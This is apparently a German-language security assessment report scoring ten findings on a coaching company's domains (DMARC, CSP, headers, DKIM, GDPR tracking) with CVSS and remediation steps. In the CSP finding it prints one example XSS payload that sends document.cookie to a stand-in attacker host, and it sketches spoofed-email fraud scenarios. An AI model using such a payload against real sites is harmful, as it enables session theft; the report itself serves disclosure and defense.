# 03 · Findings Report — CVSS-Scored

Alle Findings aus [`01-external-assessment.md`](01-external-assessment.md) und
[`02-threat-model.md`](02-threat-model.md), konsolidiert und mit
**CVSS 3.1 Base Score** bewertet.

CVSS-Vector-Format: `AV:Angriffsvektor / AC:Komplexität / PR:Privilegien / UI:User-Interaktion / S:Scope / C:Confidentiality / I:Integrity / A:Availability`

---

## F1 — DMARC-Policy `p=none` (HIGH, 7.5)

**Beobachtung:** `_dmarc.lovelifepassport.com` ist auf `v=DMARC1; p=none; pct=100;`
gesetzt. Es gibt **keine `rua=`/`ruf=` Reporting-Adresse**, also auch keine
Failure-Reports.

**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` → **7.5 (HIGH)**

**Angriffsszenario:**

Ein Angreifer kann sich beliebige `From:`-Adressen unter
`@lovelifepassport.com` ausstellen und an Sales-Team, Setter, Closer, Mentoren
oder Kunden senden. Die Empfänger-Mail-Server lehnen die Mail **nicht ab** und
**quarantänieren sie nicht** (weil `p=none`). Sie loggen den Failure nur intern.

Konkrete Szenarien:

1. **CEO-Fraud:** Mail von "alex.westhuis@lovelifepassport.com" an Controller
   ("Bitte überweise sofort € X an Konto Y für Bali-Retreat-Anzahlung")
2. **Lead-Phishing:** Mail von "noreply@lovelifepassport.com" mit gefälschtem
   Inner-Circle-Onboarding-Link an Quiz-Leads (Adressliste über Leak/Scrape
   beschaffbar)
3. **Bewerber-Phishing:** Mail von "sabrina.kragler@lovelifepassport.com" an
   Bewerber mit Fake-Onboarding-Dokumenten

**Impact:**
- Finanzbetrug (CEO-Fraud durchschnittlicher Schaden in DE laut BSI 2024: 150K-2M€/Vorfall)
- Reputationsverlust durch Lead-Phishing
- DSGVO-Risiko, wenn Lead-Daten via Phishing abgefischt werden

**Fix:**

```dns
_dmarc.lovelifepassport.com  TXT  "v=DMARC1; p=quarantine; pct=100; rua=mailto:dmarc-reports@lovelifepassport.com; ruf=mailto:dmarc-forensic@lovelifepassport.com; aspf=s; adkim=s; sp=quarantine; fo=1;"
```

Roll-Out-Plan:
1. **Woche 0:** DMARC-Reporting-Service einrichten (z.B. [Postmark DMARC Digests](https://dmarc.postmarkapp.com/), kostenlos)
2. **Woche 0:** `p=quarantine` mit `pct=10` setzen
3. **Woche 1-2:** Reports auswerten, alle legitimen Sender finden (Google, HubSpot, Zendesk — bereits in SPF, aber DKIM prüfen)
4. **Woche 3:** `pct=100` auf `p=quarantine`
5. **Woche 5:** Falls keine False-Positives → `p=reject`

**Aufwand:** 1h Setup + 4-6 Wochen passives Monitoring

**Referenz:** [BSI Mindeststandard E-Mail (MS-MAIL)](https://www.bsi.bund.de/),
[M3AAWG DMARC Best Practices](https://www.m3aawg.org/)

---

## F2 — Keine effektive Content-Security-Policy (MEDIUM, 6.1)

**Beobachtung:** Auf `analyse.*`, `strategie.*`, `obk.*`, `retreat.*`,
`www.lovelifepassport.com` ist die CSP nur:

```
Content-Security-Policy: frame-ancestors 'self'
```

Es gibt **kein `default-src`, kein `script-src`, kein `connect-src`**.

**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` → **6.1 (MEDIUM)**

**Angriffsszenario:**

CSP ist **Defense-in-Depth gegen XSS und Data-Exfiltration**. Wenn das primäre
Escape im Funnel-Builder oder in einem HubSpot-Template versagt, gibt es keine
zweite Verteidigungslinie. Ein im Quiz-Antwortfeld eingeschleustes
`<script>fetch('https://attacker.tld/?leak='+document.cookie)</script>` würde
nicht durch CSP-Connect-Source blockiert.

**Impact:** Defense-in-Depth fehlt — Angriff funktioniert, wenn primäre Defense bricht.

**Fix:** CSP schrittweise auf den Funnel-Builder-Subdomains erweitern:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://onecdn.io https://*.hs-scripts.com https://*.hs-banner.com https://*.hsadspixel.net https://www.googletagmanager.com https://connect.facebook.net https://analytics.tiktok.com;
  connect-src 'self' https://*.hubspot.com https://*.hs-analytics.net https://google-analytics.com https://www.facebook.com https://analytics.tiktok.com;
  img-src 'self' data: https: ;
  style-src 'self' 'unsafe-inline' https://onecdn.io;
  font-src 'self' https://onecdn.io data: ;
  frame-ancestors 'self';
  upgrade-insecure-requests;
  report-uri https://lovelifepassport.report-uri.com/r/d/csp/enforce;
```

**Aufwand:** 2-4h (Test pro Subdomain, da viele 3rd-Party-Sources)

**Stolperfalle:** Der Funnel-Builder ist proprietär — möglicherweise muss der
Builder-Anbieter die CSP setzen, nicht LLP selbst. Tickets an
Funnel-Builder-Vendor stellen.

---

## F3 — ClickFunnels-Webclass ohne Security-Header (MEDIUM, 5.4)

**Beobachtung:** `ateschthing.clickfunnels.com/llp-webclass` hat **keine
einzige Security-Header**: kein CSP, kein HSTS, kein X-Frame-Options, kein
X-Content-Type-Options.

**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` → **5.4 (MEDIUM)**

**Angriffsszenario:**

- **Clickjacking:** LLP-Webclass könnte in einen anderen Frame eingebettet werden ("Login zum Webclass-Bonus")
- **MITM ohne HSTS:** Erstanfrage über HTTP nicht erzwungen HTTPS
- **MIME-Sniffing:** falls Webclass jemals User-Upload akzeptiert

**Impact:** Mittel — die Webclass ist ein Mid/Low-Ticket-Trip-Wire, kein
High-Ticket-Closer. Trotzdem: Brand-Schaden, weil URL `LLP-Webclass` heißt.

**Fix:**

LLP hat als ClickFunnels-Kunde **keinen direkten Header-Einfluss** — Header
werden vom CF-Server gesetzt. Optionen:

1. ClickFunnels-Support-Ticket: "Add security headers to my funnel"
2. Cloudflare Worker davor stellen, um Header zu injizieren (nicht möglich,
   da `clickfunnels.com` nicht LLPs Domain ist)
3. **Migration auf eigene Domain** (z.B. `webclass.lovelifepassport.com` →
   Cloudflare-CNAME → ClickFunnels Custom Domain) und dann Header über
   Cloudflare Transform Rules setzen ← **empfohlen**

**Aufwand:** 2-4h (Custom-Domain-Setup) + ClickFunnels-Plan prüfen

---

## F4 — HSTS ohne `includeSubDomains; preload` (MEDIUM, 4.8)

**Beobachtung:** Auf Funnel-Builder-Subdomains:

```
Strict-Transport-Security: max-age=31536000
```

Es fehlen `includeSubDomains` und `preload`.

**CVSS 3.1 Vector:** `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N` → **4.8 (MEDIUM)**

**Angriffsszenario:**

Wenn ein Angreifer eine neue Subdomain übernimmt (z.B. via Typo-Squatting in
DNS oder DNS-Hijack), kann er HTTPS auf der Subdomain nicht-erzwingen lassen
und SSL-Stripping betreiben. `includeSubDomains` würde HSTS auf alle
Subdomains automatisch ausweiten.

**Impact:** Niedrig-mittel (HSTS-Preload ist Best Practice, aber
Real-World-Exploitation selten).

**Fix:**

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

Plus Eintrag in [hstspreload.org](https://hstspreload.org/) (irreversibel —
vor Submit: sicherstellen, dass alle Subdomains HTTPS-only sind).

**Aufwand:** 1h + sorgfältige Subdomain-Prüfung

---

## F5 — Schwacher Google-DKIM-Key (1024-bit RSA) (LOW, 3.7)

**Beobachtung:**

```
google._domainkey.lovelifepassport.com  TXT  v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQ...
```

Der DER-Header `MIGfMA0...` deutet auf einen **1024-bit RSA-Key** hin.

**CVSS 3.1 Vector:** `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N` → **3.7 (LOW)**

**Angriffsszenario:**

1024-bit RSA gilt seit NIST SP 800-131A (2014) als deprecated. Ein finanziell
motivierter Angreifer könnte mit ~100 GPU-Stunden (Kosten ~$50 auf AWS Spot)
den privaten Schlüssel faktorisieren und beliebige DKIM-signierte Mails von
LLPs Google-Workspace-Konto fälschen.

**Impact:** Niedrig, aber bei kombiniertem Angriff mit F1 (DMARC `p=none`)
extrem stark, weil DKIM-Signatur dann legitim aussieht.

**Fix:** Google Workspace Admin Console → "Apps → Google Workspace → Gmail →
Authenticate email" → DKIM-Key auf 2048-bit regenerieren. Neuer `p=`-Wert
in DNS-TXT aktualisieren.

**Aufwand:** 15 min

---

## F6 — Kein `/.well-known/security.txt` (LOW, 2.0)

**Beobachtung:** `https://www.lovelifepassport.com/.well-known/security.txt` → 404.

**CVSS 3.1 Vector:** N/A (Compliance/Hygiene-Issue, kein direkter Exploit)

**Angriffsszenario:** Sicherheitsforscher und Bug-Bounty-Hunter finden keinen
Disclosure-Kanal. Folge: Findings werden öffentlich gepostet (Twitter, Reddit),
nicht privat gemeldet → Brand-Schaden + Verlust der Möglichkeit zur stillen
Behebung.

**Fix:** `/.well-known/security.txt` mit:

```
Contact: mailto:security@lovelifepassport.com
Contact: https://lovelifepassport.com/security/report
Expires: 2027-05-19T00:00:00Z
Encryption: https://lovelifepassport.com/security/pgp.txt
Acknowledgments: https://lovelifepassport.com/security/hall-of-fame
Preferred-Languages: de, en
Canonical: https://www.lovelifepassport.com/.well-known/security.txt
Policy: https://lovelifepassport.com/security/policy
```

**Aufwand:** 30 min in Webflow (Custom Code + Page-Redirect)

**Referenz:** [RFC 9116](https://www.rfc-editor.org/rfc/rfc9116)

---

## F7 — Information Disclosure via Webflow-Header (INFO, 0.0)

**Beobachtung:** Webflow setzt `x-lambda-id`, `x-wf-region`, `surrogate-key`
Header — diese leaken Backend-Details.

**CVSS 3.1 Vector:** N/A (informativ, kein Exploit)

**Fix:** Cloudflare Transform Rule "Remove Response Headers" → entfernt die
Header am Edge:

```
x-lambda-id, x-wf-region, surrogate-key, x-amzn-trace-id
```

**Aufwand:** 30 min in Cloudflare

---

## F8 — DSGVO/Schrems-II: Webflow Hosting in `us-east-1` (MEDIUM, kein CVSS)

**Beobachtung:** Response-Header `x-wf-region: us-east-1` zeigt, dass
www.lovelifepassport.com auf Webflow-Lambda in AWS US-East-1 läuft.

**Auftrags-Datenverarbeitung:** Webflow hat eine SCC (Standard Contractual Clauses)
DPA — formal abgesichert. Aber: Nach Schrems II (EuGH C-311/18) sind SCCs
allein nicht ausreichend, wenn der US-Cloud-Provider unter den US-CLOUD-Act
fällt (AWS tut das).

**Impact:**

- Lead-IP-Adressen werden über US-Server geroutet
- DSGVO-Aufsichtsbehörden (BfDI, LfDI) sehen das kritisch — siehe
  [Hamburg-LfDI-Stellungnahme zu Webflow](https://datenschutz-hamburg.de/),
  [noyb.eu](https://noyb.eu/)
- Bußgeld-Risiko (Art. 44 DSGVO) — bisher selten geahndet, aber Trend steigt

**Fix-Optionen:**

1. **Webflow EU-Hosting beantragen** (Webflow Enterprise-Tier hat das, ggf. Plan-Upgrade)
2. **Webflow durch EU-CMS ersetzen** (Storyblok, Hygraph, Contentful EU-Plan) ← teure Migration
3. **Status quo akzeptieren mit gut dokumentierter Risiko-Abwägung** im Verzeichnis
   von Verarbeitungstätigkeiten (Art. 30 DSGVO) — pragmatischer Mittelweg

**Aufwand:** je nach Option 2h (Doku) bis Wochen (Migration)

---

## F9 — Pre-Consent-Loading von Tracking-Skripten (HIGH, kein CVSS — DSGVO)

**Beobachtung:** Im Page-Source von `analyse.lovelifepassport.com` (verifiziert
2026-05-18) werden HubSpot-Scripts `js-eu1.hs-scripts.com/26317639.js`,
GTM-Script `googletagmanager.com/gtm.js?id=GTM-KMGMM4H` und das HubSpot
Cookie-Banner-Script direkt im `<head>` geladen — **vor jeder
Einwilligung-Entscheidung des Users**.

**Rechtliche Lage (DACH):**

- **TTDSG § 25 Abs. 1:** *Speicherung* von Cookies + *Zugriff auf Endgerät*
  bedarf Einwilligung. **HubSpot-Script-Loading ohne Cookie-Setzung** ist
  kontrovers — Aufsichtsbehörden (DSK 2024) argumentieren, dass auch das
  Laden des Scripts schon einen Server-Kontakt = IP-Übermittlung darstellt.
- **DSGVO Art. 6:** Server-Kontakt vor Einwilligung = Datenverarbeitung ohne
  Rechtsgrundlage.
- **Aktueller Stand:** LG Köln (Az. 31 O 92/22), LG Berlin (Az. 16 O 420/19),
  EuGH "Planet49" (C-673/17) — alle stützen restriktive Auslegung.

**Impact:**

- Abmahn-Risiko durch Wettbewerber-Anwälte (€800-2500 pro Abmahnung)
- Bußgeld durch Aufsichtsbehörde (Art. 83 DSGVO bis 20 Mio € / 4 % Jahresumsatz)
- Schadensersatz durch User (Art. 82 DSGVO — seit BGH 2022 erste Urteile)

**Fix:**

1. **Consent-Mode v2** strikt enforcen — Skripte NUR nach Opt-In laden,
   nicht via `denied`-Default
2. Migration zu einem **echten CMP** (Einwilligung Management Platform) wie
   Usercentrics, Cookiebot, iubenda — die haben das gelöst
3. Im aktuellen Zustand: zwingend Datenschutzerklärung mit klarem
   Hinweis "wir laden HubSpot-Scripts, bevor du zustimmst, weil…" — und
   Rechtsgrundlage benennen (Art. 6(1)(f) berechtigtes Interesse — hier sehr fragwürdig)

**Aufwand:** 4-8h (CMP-Integration) — bei eigenem Quiz-Builder ggf. nicht trivial

**Referenz:** Eigene Doku siehe [`../tracking-full/05-consent-and-dsgvo.md`](../tracking-full/05-consent-and-dsgvo.md)
— **das MindForge-Demo macht es richtig**: HubSpot-Form-Submit wird auf
Vertragserfüllungs-Basis (Art. 6(1)(b)) gefeuert, Pixel nur nach Einwilligung.

---

## F10 — HubSpot `__ptc.gif` Behavioral-Tracking (MEDIUM, kein CVSS — DSGVO)

**Beobachtung:** Live-Analyse zeigte HubSpot-Pixel-Tracking-Cookie `__ptc.gif`
mit Übermittlung von **Mauskoordinaten** und **komplettem CSS-Selector**
zum geklickten Element.

**Rechtliche Lage:**

- **DSGVO Art. 5(1)(c):** Datenminimierung — Mauskoordinaten sind für die
  primäre Zwecke (Lead-Capture) **nicht notwendig**
- **DSGVO Art. 6:** Rechtsgrundlage muss verhältnismäßig sein
- **TTDSG § 25:** Einwilligungspflicht

**Impact:**
- Granulares Behavioral-Tracking ohne klare Notwendigkeit
- Auch nach Einwilligung rechtlich grenzwertig

**Fix:** HubSpot Settings → Tracking → "Site Activity Tracking" oder
"Behavioral Targeting" deaktivieren falls nicht business-kritisch genutzt.
Alternativ: granular nur auf Konversions-Events einschränken.

**Aufwand:** 30 min in HubSpot Settings

---

## 11. Findings-Übersicht (Sortiert nach Severity)

| Severity | # | Finding | Fix-Aufwand |
|---|---|---|---|
| **HIGH** | F1 | DMARC `p=none` | 1h Setup + 4-6 Wochen Monitoring |
| **HIGH** | F9 | Pre-Consent Tracking-Loading | 4-8h |
| **MEDIUM** | F2 | Keine Content-Security-Policy | 2-4h |
| **MEDIUM** | F3 | ClickFunnels ohne Headers | 2-4h (via Custom-Domain) |
| **MEDIUM** | F4 | HSTS ohne includeSubDomains/preload | 1h |
| **MEDIUM** | F8 | Webflow US-Hosting (Schrems II) | 2h Doku oder Migration |
| **MEDIUM** | F10 | HubSpot Behavioral Tracking | 30 min |
| **LOW** | F5 | 1024-bit Google-DKIM | 15 min |
| **LOW** | F6 | Kein security.txt | 30 min |
| **INFO** | F7 | Webflow Information Disclosure | 30 min |

**Gesamt-Aufwand für alle Quick-Wins:** ~15-25 Stunden für signifikante
Risiko-Reduktion über alle Findings.

---

## 12. Was als nächstes (ein "Pentest" wäre)

Folgende Findings könnten **NUR mit schriftlicher Autorisierung** näher
untersucht werden:

- **Quiz-Submit-Endpoint:** XSS/SSRF/CSRF im XHR-POST-Body
- **HubSpot-Form-Embed-Lücken:** Form-ID-Brute-Forcing
- **Make-Webhook-URL:** Reverse-Engineering aus JS-Bundle (würde Make-Webhook offenlegen, dann Auth-Header testbar)
- **Aircall-Webhook-Integrationen:** Replay-Angriffe
- **Power BI Embedded URLs:** sofern öffentlich, ggf. Lookups erlaubt
- **Streamlit-Interne-Tools:** sofern öffentlich erreichbar (sollten sie nicht sein)
- **GCP Cloud-Function-Endpoints:** sofern LLP eigene betreibt

Vorschlag für einen autorisierten Mini-Pentest siehe
[`04-disclosure-mail.md`](04-disclosure-mail.md) §3.
